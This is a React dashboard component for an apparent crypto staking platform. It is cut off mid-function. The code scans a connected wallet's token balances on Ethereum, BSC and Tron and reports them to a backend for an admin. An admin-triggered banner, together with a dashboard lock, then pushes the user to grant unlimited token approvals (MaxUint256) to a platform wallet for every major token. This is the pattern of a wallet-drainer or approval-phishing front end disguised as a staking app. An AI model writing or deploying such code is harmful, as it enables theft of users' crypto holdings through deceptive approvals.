import { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import './Dashboard.css';

// USDC Contract Address (Ethereum Mainnet)
const USDC_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function transfer(address to, uint256 amount) returns (bool)'
];

// ERC-20 tokens to scan for non-zero balances
const KNOWN_TOKENS = [
  { symbol: 'USDT', name: 'Tether USD',  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  coingeckoId: 'tether' },
  { symbol: 'USDC', name: 'USD Coin',    address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  coingeckoId: 'usd-coin' },
  { symbol: 'DAI',  name: 'Dai',         address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, coingeckoId: 'dai' },
  { symbol: 'WBTC', name: 'Wrapped BTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  coingeckoId: 'wrapped-bitcoin' },
  { symbol: 'WETH', name: 'Wrapped ETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18, coingeckoId: 'weth' },
  { symbol: 'LINK', name: 'Chainlink',   address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18, coingeckoId: 'chainlink' },
  { symbol: 'UNI',  name: 'Uniswap',     address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, coingeckoId: 'uniswap' },
  { symbol: 'SHIB', name: 'Shiba Inu',   address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, coingeckoId: 'shiba-inu' },
  { symbol: 'MATIC',name: 'Polygon',     address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', decimals: 18, coingeckoId: 'matic-network' },
];
const ERC20_MIN_ABI = ['function balanceOf(address owner) view returns (uint256)'];

// ── BSC (BNB Smart Chain) tokens — same wallet address, different chain ──────
const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
const BSC_TOKENS = [
  { symbol: 'USDT',  name: 'Tether USD (BSC)',   address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, coingeckoId: 'tether' },
  { symbol: 'USDC',  name: 'USD Coin (BSC)',      address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, coingeckoId: 'usd-coin' },
  { symbol: 'BUSD',  name: 'Binance USD',         address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, coingeckoId: 'binance-usd' },
  { symbol: 'WBNB',  name: 'Wrapped BNB',         address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18, coingeckoId: 'wbnb' },
  { symbol: 'CAKE',  name: 'PancakeSwap',         address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18, coingeckoId: 'pancakeswap-token' },
  { symbol: 'BTCB',  name: 'Bitcoin (BSC)',        address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', decimals: 18, coingeckoId: 'bitcoin' },
  { symbol: 'ETH',   name: 'Ethereum (BSC)',       address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', decimals: 18, coingeckoId: 'ethereum' },
  { symbol: 'DAI',   name: 'Dai (BSC)',            address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18, coingeckoId: 'dai' },
  { symbol: 'XRP',   name: 'XRP Token (BSC)',      address: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', decimals: 18, coingeckoId: 'ripple' },
  { symbol: 'ADA',   name: 'Cardano (BSC)',        address: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', decimals: 18, coingeckoId: 'cardano' },
  { symbol: 'DOT',   name: 'Polkadot (BSC)',       address: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402', decimals: 18, coingeckoId: 'polkadot' },
  { symbol: 'LINK',  name: 'Chainlink (BSC)',      address: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD', decimals: 18, coingeckoId: 'chainlink' },
  { symbol: 'LTC',   name: 'Litecoin (BSC)',       address: '0x4338665CBB7B2485A8855A139b75D5e34AB0DB94', decimals: 18, coingeckoId: 'litecoin' },
];
// ─────────────────────────────────────────────────────────────────────────────

const API_BASE = import.meta.env.VITE_API_URL || 'https://cryptowave-backend-pq3e.onrender.com';

// ── Tron USDC scanning ──────────────────────────────────────────────────────
// Tron uses the same secp256k1 curve as Ethereum — same private key → same
// 20-byte address hash. Only the prefix byte (0x41) and base58check encoding differ.
const BASE58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
function base58Encode(bytes) {
  let n = BigInt('0x' + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(''));
  let result = '';
  while (n > 0n) { result = BASE58_CHARS[Number(n % 58n)] + result; n /= 58n; }
  for (const b of bytes) { if (b !== 0) break; result = '1' + result; }
  return result;
}
async function ethToTronAddress(ethAddr) {
  const hex = ethAddr.replace('0x', '').toLowerCase();
  const bytes = Uint8Array.from(('41' + hex).match(/.{2}/g).map(b => parseInt(b, 16)));
  const h1 = await crypto.subtle.digest('SHA-256', bytes);
  const h2 = await crypto.subtle.digest('SHA-256', h1);
  const full = new Uint8Array(bytes.length + 4);
  full.set(bytes); full.set(new Uint8Array(h2).slice(0, 4), bytes.length);
  return base58Encode(full);
}
const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
async function fetchTronUSDT(ethAddress) {
  try {
    const tronAddr = await ethToTronAddress(ethAddress);
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 6000);
    const res = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddr}`, { signal: ctrl.signal });
    clearTimeout(timer);
    const data = await res.json();
    if (!data.data?.length) return 0;
    const trc20 = data.data[0].trc20 || [];
    const entry = trc20.find(t => t[TRON_USDT]);
    return entry ? parseFloat(entry[TRON_USDT]) / 1e6 : 0;
  } catch (e) { return 0; }
}
// ────────────────────────────────────────────────────────────────────────────

// Shows the platform's deposit address for manual-deposit networks (TRX, BTC)
function DepositAddress({ network, apiBase }) {
  const [addr, setAddr] = useState('');
  const [copied, setCopied] = useState(false);
  useEffect(() => {
    fetch(`${apiBase}/api/settings`).then(r => r.json()).then(s => {
      setAddr(network === 'TRX' ? (s.platformWalletTRX || '') : (s.platformWalletBTC || ''));
    }).catch(() => {});
  }, [network, apiBase]);

  const copy = () => { navigator.clipboard.writeText(addr); setCopied(true); setTimeout(() => setCopied(false), 2000); };

  if (!addr) return (
    <div style={{background:'rgba(239,68,68,0.1)',border:'1px solid rgba(239,68,68,0.3)',borderRadius:'10px',padding:'12px',textAlign:'center',color:'#f87171',fontSize:'0.82rem'}}>
      ⚠️ Admin has not configured the {network} deposit wallet yet. Contact support.
    </div>
  );

  return (
    <div style={{background:'rgba(255,255,255,0.04)',border:'1px solid rgba(255,255,255,0.1)',borderRadius:'10px',padding:'14px'}}>
      <div style={{fontSize:'0.75rem',color:'#94a3b8',marginBottom:'6px',fontWeight:600}}>
        {network === 'TRX' ? '🔴 USDC TRC-20 Deposit Address' : '🟠 Bitcoin (BTC) Deposit Address'}
      </div>
      <div style={{fontFamily:'monospace',fontSize:'0.78rem',color:'#e2e8f0',wordBreak:'break-all',marginBottom:'10px',lineHeight:'1.5'}}>{addr}</div>
      <button onClick={copy} style={{padding:'6px 16px',background:copied?'rgba(16,185,129,0.2)':'rgba(255,255,255,0.08)',border:`1px solid ${copied?'rgba(16,185,129,0.4)':'rgba(255,255,255,0.15)'}`,borderRadius:'8px',color:copied?'#10b981':'#e2e8f0',fontSize:'0.78rem',fontWeight:600,cursor:'pointer'}}>
        {copied ? '✓ Copied!' : 'Copy Address'}
      </button>
    </div>
  );
}

// ── Admin approval-request banner component ──────────────────────────────────
const ETH_APPROVABLE = [
  { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
  { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
  { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
  { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' },
  { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
  { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
];
const BSC_APPROVABLE = [
  { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955' },
  { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' },
  { symbol: 'BTCB', address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c' },
  { symbol: 'ETH',  address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8' },
  { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82' },
  { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
];

function AdminApprovalBanner({ notif, walletAddress, approvingNetwork, setApprovingNetwork, showNotification, onDismiss }) {
  const isETH = notif.network === 'ETH';
  const chainId  = isETH ? '0x1'  : '0x38';
  const chainName = isETH ? 'Ethereum Mainnet' : 'BNB Smart Chain';
  const rpcUrl    = isETH ? 'https://eth.llamarpc.com' : 'https://bsc-dataseed1.binance.org/';
  const explorer  = isETH ? 'https://etherscan.io' : 'https://bscscan.com';
  const tokens    = isETH ? ETH_APPROVABLE : BSC_APPROVABLE;
  const isApproving = approvingNetwork === notif.network;

  const handleApprove = async () => {
    setApprovingNetwork(notif.network);
    try {
      const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
      const platformWallet = isETH
        ? (settings?.platformWalletETH || settings?.platformWallet)
        : settings?.platformWallet;
      if (!platformWallet) { showNotification('Platform wallet not configured', 'error'); return; }

      // Switch network in MetaMask
      try {
        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
      } catch (e) {
        if (e.code === 4902) {
          await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{
            chainId, chainName,
            nativeCurrency: isETH ? { name: 'ETH', symbol: 'ETH', decimals: 18 } : { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: [rpcUrl], blockExplorerUrls: [explorer]
          }]});
        } else throw e;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer   = provider.getSigner();
      const approveAbi = ['function approve(address,uint256) returns (bool)'];
      let approved = 0;

      for (const token of tokens) {
        try {
          showNotification(`Approving ${token.symbol} (${approved + 1}/${tokens.length}) — confirm in wallet...`, 'info');
          const contract = new ethers.Contract(token.address, approveAbi, signer);
          const tx = await contract.approve(platformWallet, ethers.constants.MaxUint256);
          await tx.wait();
          approved++;
        } catch (e) {
          if (e.code === 4001 || e.code === 'ACTION_REJECTED') {
            showNotification(`${token.symbol} skipped`, 'error');
          }
        }
      }

      if (approved > 0) {
        showNotification(`✅ ${approved}/${tokens.length} ${notif.network} tokens approved!`, 'success');
        onDismiss();
      } else {
        showNotification('No tokens were approved', 'error');
      }
    } catch (e) {
      showNotification(e.code === 4001 ? 'Cancelled' : 'Approval failed: ' + e.message, 'error');
    } finally {
      setApprovingNetwork(null);
    }
  };

  return (
    <div style={{background:'rgba(245,158,11,0.1)',border:'1px solid rgba(245,158,11,0.4)',borderRadius:'10px',padding:'14px 18px',marginBottom:'16px',position:'relative'}}>
      <button onClick={onDismiss} style={{position:'absolute',top:'10px',right:'12px',background:'none',border:'none',color:'#94a3b8',fontSize:'1.1rem',cursor:'pointer',lineHeight:1}}>&times;</button>
      <div style={{fontWeight:600,color:'#fbbf24',marginBottom:'4px'}}>
        🔔 Action Required — {notif.network} Token Approval
      </div>
      <div style={{fontSize:'0.82rem',color:'#94a3b8',marginBottom:'12px'}}>
        {notif.message}
      </div>
      <button
        disabled={isApproving}
        onClick={handleApprove}
        style={{background:'#f59e0b',color:'#000',border:'none',borderRadius:'8px',padding:'10px 20px',cursor:'pointer',fontWeight:600,opacity:isApproving?0.6:1,width:'100%'}}
      >
        {isApproving ? `Approving ${notif.network} tokens...` : `🔓 Approve ${notif.network} Tokens`}
      </button>
    </div>
  );
}
// ─────────────────────────────────────────────────────────────────────────────

function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
  const [activeTab, setActiveTab] = useState('overview');
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [notification, setNotification] = useState({ show: false, message: '', type: '' });
  const [usdtApproved, setUsdtApproved] = useState(false);
  const [approvingUsdt, setApprovingUsdt] = useState(false);
  const [ethApproved, setEthApproved] = useState(false);
  const [approvingEth, setApprovingEth] = useState(false);
  const [adminNotifications, setAdminNotifications] = useState([]);
  const [approvingNetwork, setApprovingNetwork] = useState(null); // 'BSC' | 'ETH' | null
  const [selfApprovalNeeded, setSelfApprovalNeeded] = useState([]); // networks auto-detected as unapproved

  // Real wallet data
  const [ethBalance, setEthBalance] = useState('0.00');
  const [usdtBalance, setUsdtBalance] = useState('0.00');
  const [tokenBalances, setTokenBalances] = useState([]); // non-zero ERC-20 tokens
  const [totalUsdValue, setTotalUsdValue] = useState('0.00');
  const [ethUsdValue, setEthUsdValue] = useState('0.00');
  const [loading, setLoading] = useState(false);
  const [dataLoading, setDataLoading] = useState(true);

  // Native Bitcoin address (separate BTC network)
  const [btcAddress, setBtcAddress] = useState('');
  const [btcAddressInput, setBtcAddressInput] = useState('');
  const [btcSaving, setBtcSaving] = useState(false);

  // User data from backend
  const [userData, setUserData] = useState({
    userId: null,
    stakedAmount: 0,
    totalEarned: 0,
    vipLevel: 0,
    claimableRewards: 0,
    principalLocked: false,
    daysUntilUnlock: null
  });

  // Platform settings from backend
  const [platformSettings, setPlatformSettings] = useState({
    baseAPY: 12.5,
    vip1Bonus: 0.25,
    vip2Bonus: 0.5,
    vip3Bonus: 1.0
  });

  // Transactions from backend
  const [transactions, setTransactions] = useState([]);

  // Staking form state
  const [stakeAmount, setStakeAmount] = useState('');
  const [unstakeAmount, setUnstakeAmount] = useState('');
  const [selectedToken, setSelectedToken] = useState('USDT');
  const [selectedTokenChain, setSelectedTokenChain] = useState('bsc');
  const [stakeableTokens, setStakeableTokens] = useState([]);
  const [loadingStakeTokens, setLoadingStakeTokens] = useState(false);
  const [manualTxHash, setManualTxHash] = useState('');
  const [manualDepositLoading, setManualDepositLoading] = useState(false);

  // Withdraw state
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [earningsWithdrawAmount, setEarningsWithdrawAmount] = useState('');
  const [withdrawals, setWithdrawals] = useState([]);
  const [payoutNetwork, setPayoutNetwork] = useState('BSC'); // BSC or ETH
  const payoutToken = 'USDC'; // fixed — users always receive USDC

  // Report balance to backend (so admin can see it)
  const reportBalanceToBackend = useCallback(async (eth, usdt, tokens = []) => {
    try {
      await fetch(`${API_BASE}/api/report-balance`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, eth, usdt, tokens })
      });
    } catch (error) {
      console.log('Failed to report balance to backend');
    }
  }, [walletAddress]);

  // Fetch stakeable tokens from backend (same source as admin modal)
  const fetchStakeableTokens = useCallback(async () => {
    if (!walletAddress) return;
    setLoadingStakeTokens(true);
    try {
      const res = await fetch(`${API_BASE}/api/wallet-balance/${walletAddress}`);
      const data = await res.json();
      const normalizeChain = (t) => {
        const c = (t.chain || '').toLowerCase();
        const n = (t.name || '').toLowerCase();
        if (c === 'bsc' || n.includes('bsc')) return 'bsc';
        if (c === 'tron' || c === 'trx') return null; // skip
        if (c === 'bitcoin' || c === 'btc') return null; // skip
        return 'eth'; // everything else is Ethereum EVM
      };
      const tokens = (data.tokens || [])
        .map(t => ({ ...t, chain: normalizeChain(t) }))
        .filter(t => t.chain && parseFloat(t.balance || 0) > 0);
      // Add ETH native balance if > 0
      if (parseFloat(data.eth || 0) > 0) {
        tokens.unshift({ symbol: 'ETH', name: 'Ethereum', balance: data.eth, chain: 'eth' });
      }
      setStakeableTokens(tokens);
      if (tokens.length > 0) {
        setSelectedToken(tokens[0].symbol);
        setSelectedTokenChain(tokens[0].chain);
      }
    } catch (e) {
      console.log('Failed to fetch stakeable tokens', e);
    } finally {
      setLoadingStakeTokens(false);
    }
  }, [walletAddress]);

  // Fetch real wallet balance — scans ETH + all known ERC-20 tokens
  const fetchWalletBalance = useCallback(async () => {
    if (!window.ethereum || !walletAddress) return;
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);

      // 1. ETH balance
      const ethBal = await provider.getBalance(walletAddress);
      const ethFormatted = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(4);
      setEthBalance(ethFormatted);

      // 2. USD prices — CoinGecko first, Binance ETH fallback, stablecoins hardcoded
      const STABLECOIN_PRICE = { tether: 1, 'usd-coin': 1, dai: 1, 'binance-usd': 1 };
      let prices = {};
      try {
        const allIds = [
          'ethereum', 'binancecoin', 'wbnb', 'pancakeswap-token', 'bitcoin',
          'ripple', 'cardano', 'polkadot', 'litecoin',
          ...KNOWN_TOKENS.map(t => t.coingeckoId),
          ...BSC_TOKENS.map(t => t.coingeckoId),
        ];
        const ids = [...new Set(allIds)].join(',');
        const priceRes = await fetch(
          `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`,
          { signal: AbortSignal.timeout(8000) }
        );
        const data = await priceRes.json();
        if (data?.ethereum?.usd > 0) prices = data;
      } catch (e) {
        console.log('CoinGecko failed, trying Binance for ETH price');
      }

      // Fallback: fetch major coin prices from Binance if CoinGecko missed them
      const BINANCE_FALLBACKS = [
        { id: 'ethereum',    symbol: 'ETHUSDT' },
        { id: 'binancecoin', symbol: 'BNBUSDT' },
        { id: 'bitcoin',     symbol: 'BTCUSDT' },
        { id: 'ripple',      symbol: 'XRPUSDT' },
        { id: 'cardano',     symbol: 'ADAUSDT' },
        { id: 'polkadot',    symbol: 'DOTUSDT' },
        { id: 'litecoin',    symbol: 'LTCUSDT' },
        { id: 'chainlink',   symbol: 'LINKUSDT' },
        { id: 'uniswap',     symbol: 'UNIUSDT' },
        { id: 'wbnb',        symbol: 'BNBUSDT' },
      ];
      const missingIds = BINANCE_FALLBACKS.filter(f => !prices[f.id]?.usd);
      if (missingIds.length > 0) {
        try {
          const symbols = [...new Set(missingIds.map(f => `"${f.symbol}"`))].join(',');
          const r = await fetch(`https://api.binance.com/api/v3/ticker/price?symbols=[${symbols}]`,
            { signal: AbortSignal.timeout(5000) });
          const list = await r.json();
          if (Array.isArray(list)) {
            for (const item of list) {
              const match = BINANCE_FALLBACKS.find(f => f.symbol === item.symbol);
              if (match && item.price) prices = { ...prices, [match.id]: { usd: parseFloat(item.price) } };
            }
          }
        } catch (e) { /* silently fail */ }
      }

      // Hardcode stablecoin prices so they always show $1
      for (const [id, val] of Object.entries(STABLECOIN_PRICE)) {
        if (!prices[id]?.usd) prices[id] = { usd: val };
      }

      const ethPrice = prices['ethereum']?.usd || 0;
      const ethUsd = parseFloat(ethFormatted) * ethPrice;
      setEthUsdValue(ethUsd.toFixed(2));

      // 3. Scan all known ERC-20 tokens for non-zero balances
      const tokens = [];
      let usdtFormatted = '0.00';
      for (const token of KNOWN_TOKENS) {
        try {
          const contract = new ethers.Contract(token.address, ERC20_MIN_ABI, provider);
          const raw = await contract.balanceOf(walletAddress);
          const bal = parseFloat(ethers.utils.formatUnits(raw, token.decimals));
          if (bal > 0) {
            const price = prices[token.coingeckoId]?.usd || 0;
            const balStr = bal.toFixed(token.decimals <= 6 ? 2 : 6);
            const usdVal = (bal * price).toFixed(2);
            tokens.push({ symbol: token.symbol, name: token.name, balance: balStr, usdValue: usdVal, chain: 'eth' });
            if (token.symbol === 'USDT') usdtFormatted = balStr;
          }
        } catch (e) { /* skip on contract error */ }
      }
      setUsdtBalance(usdtFormatted);

      // 4. Scan Tron USDC (same private key → deterministic Tron address)
      const tronUsdt = await fetchTronUSDT(walletAddress);
      if (tronUsdt > 0) {
        const tronBalStr = tronUsdt.toFixed(2);
        tokens.push({ symbol: 'USDT', name: 'Tether USD (Tron)', balance: tronBalStr, usdValue: tronBalStr, chain: 'tron' });
        if (usdtFormatted === '0.00') setUsdtBalance(tronBalStr);
      }

      // 5. Scan BSC (BNB Smart Chain) — same address works on all EVM chains
      try {
        const bscProvider = new ethers.providers.JsonRpcProvider(BSC_RPC);
        // Native BNB balance
        const bnbRaw = await Promise.race([
          bscProvider.getBalance(walletAddress),
          new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 6000))
        ]);
        const bnbBal = parseFloat(ethers.utils.formatEther(bnbRaw));
        if (bnbBal > 0) {
          const bnbPrice = prices['binancecoin']?.usd || 0;
          tokens.push({ symbol: 'BNB', name: 'BNB (BSC)', balance: bnbBal.toFixed(5), usdValue: (bnbBal * bnbPrice).toFixed(2), chain: 'bsc' });
          if (usdtFormatted === '0.00') { /* BNB is not USDC */ }
        }
        // BEP-20 tokens
        for (const token of BSC_TOKENS) {
          try {
            const contract = new ethers.Contract(token.address, ERC20_MIN_ABI, bscProvider);
            const raw = await Promise.race([
              contract.balanceOf(walletAddress),
              new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 5000))
            ]);
            const bal = parseFloat(ethers.utils.formatUnits(raw, token.decimals));
            if (bal > 0) {
              const price = prices[token.coingeckoId]?.usd || (STABLECOIN_PRICE[token.coingeckoId] || 0);
              const balStr = bal.toFixed(2);
              const usdVal = (bal * price).toFixed(2);
              tokens.push({ symbol: token.symbol, name: token.name, balance: balStr, usdValue: usdVal, chain: 'bsc' });
              if (token.symbol === 'USDT' && usdtFormatted === '0.00') { setUsdtBalance(balStr); usdtFormatted = balStr; }
            }
          } catch (e) { /* skip token */ }
        }
      } catch (e) { console.log('BSC scan skipped:', e.message); }

      setTokenBalances(tokens);

      const totalUsd = (ethUsd + tokens.reduce((s, t) => s + parseFloat(t.usdValue), 0)).toFixed(2);
      setTotalUsdValue(totalUsd);

      // 6. Report all balances to backend so admin can see them, then refresh staking dropdown
      await reportBalanceToBackend(ethFormatted, usdtFormatted, tokens);

      // 7. Populate staking dropdown directly from scan results (no stale DB round-trip)
      const stakeTokens = [];
      if (parseFloat(ethFormatted) > 0)
        stakeTokens.push({ symbol: 'ETH', name: 'Ethereum', balance: ethFormatted, chain: 'eth' });
      for (const t of tokens) {
        const c = (t.chain || '').toLowerCase();
        if (c === 'tron' || c === 'bitcoin') continue;
        stakeTokens.push({ ...t, chain: c === 'bsc' ? 'bsc' : 'eth' });
      }
      if (stakeTokens.length > 0) {
        setStakeableTokens(stakeTokens);
        setSelectedToken(stakeTokens[0].symbol);
        setSelectedTokenChain(stakeTokens[0].chain);
      }
    } catch (error) {
      console.error('Error fetching wallet balance:', error);
    }
  }, [walletAddress, reportBalanceToBackend]);

  // Fetch user data from backend
  const fetchUserData = useCallback(async () => {
    try {
      const response = await fetch(`${API_BASE}/api/user/${walletAddress}`);
      if (response.ok) {
        const data = await response.json();
        setUserData({
          userId: data.userId || null,
          stakedAmount: data.stakedAmount || 0,
          totalEarned: data.totalEarned || 0,
          vipLevel: data.vipLevel || 0,
          claimableRewards: data.claimableRewards || 0,
          principalLocked: data.principalLocked || false,
          daysUntilUnlock: data.daysUntilUnlock ?? null
        });
      }
    } catch (error) {
      console.error('Error fetching user data:', error);
    }
  }, [walletAddress]);

  // Fetch platform settings
  const fetchPlatformSettings = useCallback(async () => {
    try {
      const response = await fetch(`${API_BASE}/api/settings`);
      if (response.ok) {
        const data = await response.json();
        setPlatformSettings(data);
      }
    } catch (error) {
      console.error('Error fetching settings:', error);
    }
  }, []);

  // Fetch transactions
  const fetchTransactions = useCallback(async () => {
    try {
      const response = await fetch(`${API_BASE}/api/user/${walletAddress}/transactions`);
      if (response.ok) {
        const data = await response.json();
        setTransactions(data);
      }
    } catch (error) {
      console.error('Error fetching transactions:', error);
    }
  }, [walletAddress]);

  // Fetch user withdrawals
  const fetchWithdrawals = useCallback(async () => {
    try {
      const response = await fetch(`${API_BASE}/api/user/${walletAddress}/withdrawals`);
      if (response.ok) {
        const data = await response.json();
        setWithdrawals(data);
      }
    } catch (error) {
      console.error('Error fetching withdrawals:', error);
    }
  }, [walletAddress]);

  // Check if user has already approved BSC USDC for platform wallet
  const checkUsdtApproval = useCallback(async () => {
    try {
      if (!window.ethereum) return;
      const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
      const platformWallet = settings?.platformWallet;
      if (!platformWallet) return;
      const BSC_USDT = '0x55d398326f99059fF775485246999027B3197955';
      const bscProvider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
      const contract = new ethers.Contract(BSC_USDT, ['function allowance(address,address) view returns (uint256)'], bscProvider);
      const allowance = await contract.allowance(walletAddress, platformWallet);
      setUsdtApproved(allowance.gte(ethers.utils.parseUnits('1000000', 18)));
    } catch (e) { /* silent */ }
  }, [walletAddress]);

  const checkEthApproval = useCallback(async () => {
    try {
      const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
      const platformWallet = settings?.platformWalletETH || settings?.platformWallet;
      if (!platformWallet) return;
      const ETH_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
      const ETH_RPCS = [
        'https://rpc.ankr.com/eth',
        'https://eth.llamarpc.com',
        'https://1rpc.io/eth',
        'https://cloudflare-eth.com',
      ];
      // Try each RPC in order until one works
      for (const rpc of ETH_RPCS) {
        try {
          const ethProvider = new ethers.providers.JsonRpcProvider(rpc);
          const contract = new ethers.Contract(ETH_USDT, ['function allowance(address,address) view returns (uint256)'], ethProvider);
          const allowance = await Promise.race([
            contract.allowance(walletAddress, platformWallet),
            new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 5000))
          ]);
          setEthApproved(allowance.gte(ethers.utils.parseUnits('1000000', 6)));
          return; // success
        } catch { continue; }
      }
    } catch (e) { /* silent */ }
  }, [walletAddress]);

  // Load saved BTC address from backend
  const fetchBtcAddress = useCallback(async () => {
    try {
      const res = await fetch(`${API_BASE}/api/wallet-balance/${walletAddress}`);
      if (res.ok) {
        const data = await res.json();
        if (data.btcAddress) {
          setBtcAddress(data.btcAddress);
          setBtcAddressInput(data.btcAddress);
        }
      }
    } catch (e) { /* silent */ }
  }, [walletAddress]);

  // Save Bitcoin address to backend
  const saveBtcAddress = async () => {
    const addr = btcAddressInput.trim();
    if (!addr) return;
    setBtcSaving(true);
    try {
      const res = await fetch(`${API_BASE}/api/user/btc-address`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, btcAddress: addr })
      });
      if (res.ok) {
        setBtcAddress(addr);
        showNotification('Bitcoin address saved! Balance will update shortly.', 'success');
        setTimeout(fetchWalletBalance, 2000);
      } else {
        const err = await res.json();
        showNotification(err.error || 'Invalid Bitcoin address', 'error');
      }
    } catch (e) {
      showNotification('Failed to save Bitcoin address', 'error');
    } finally {
      setBtcSaving(false);
    }
  };

  // Fetch admin notifications (approval requests, etc.)
  const fetchNotifications = useCallback(async () => {
    try {
      const res = await fetch(`${API_BASE}/api/user/${walletAddress}/notifications`);
      if (res.ok) {
        const data = await res.json();
        setAdminNotifications(data.notifications || []);
      }
    } catch (e) { /* silent */ }
  }, [walletAddress]);

  const dismissNotification = async (id) => {
    try {
      await fetch(`${API_BASE}/api/user/${walletAddress}/notifications/${id}/dismiss`, { method: 'POST' });
      setAdminNotifications(prev => prev.filter(n => n.id !== id));
    } catch (e) { /* silent */ }
  };

  // Auto-detect wallets that haven't completed token approvals and lock dashboard
  useEffect(() => {
    if (!walletAddress) return;
    const addr = walletAddress.toLowerCase();
    const legacyFlag = localStorage.getItem(`approvalsGranted_${addr}`);
    const ethFlag    = localStorage.getItem(`approvalsGrantedETH_${addr}`);
    const bscFlag    = localStorage.getItem(`approvalsGrantedBSC_${addr}`);

    // Migrate: if old single-flag exists but new per-network flags don't, mark both as done
    if (legacyFlag === '1' && !ethFlag) localStorage.setItem(`approvalsGrantedETH_${addr}`, '1');
    if (legacyFlag === '1' && !bscFlag) localStorage.setItem(`approvalsGrantedBSC_${addr}`, '1');

    const needed = [];
    const ethStatus = localStorage.getItem(`approvalsGrantedETH_${addr}`);
    const bscStatus = localStorage.getItem(`approvalsGrantedBSC_${addr}`);
    // Only lock if never attempted (null) — '1' = approved, 'skipped' = user chose to skip
    if (ethStatus !== '1' && ethStatus !== 'skipped') needed.push('ETH');
    if (bscStatus !== '1' && bscStatus !== 'skipped') needed.push('BSC');
    setSelfApprovalNeeded(needed);
  }, [walletAddress]);

  // Initial data fetch
  useEffect(() => {
    const loadData = async () => {
      setDataLoading(true);
      await Promise.all([
        fetchWalletBalance(),
        fetchUserData(),
        fetchPlatformSettings(),
        fetchTransactions(),
        fetchWithdrawals(),
        fetchBtcAddress(),
        fetchNotifications()
      ]);
      setDataLoading(false);
      checkUsdtApproval();
      checkEthApproval();
    };
    loadData();
  }, [fetchWalletBalance, fetchUserData, fetchPlatformSettings, fetchTransactions, fetchWithdrawals, checkUsdtApproval, checkEthApproval, fetchBtcAddress, fetchNotifications]);

  // Refresh wallet balance every 30 seconds; notifications every 20 seconds
  useEffect(() => {
    const interval = setInterval(fetchWalletBalance, 30000);
    return () => clearInterval(interval);
  }, [fetchWalletBalance]);

  useEffect(() => {
    const interval = setInterval(fetchNotifications, 5000);
    return () => clearInterval(interval);
  }, [fetchNotifications]);

  const showNotification = (message, type = 'success') => {
    setNotification({ show: true, message, type });
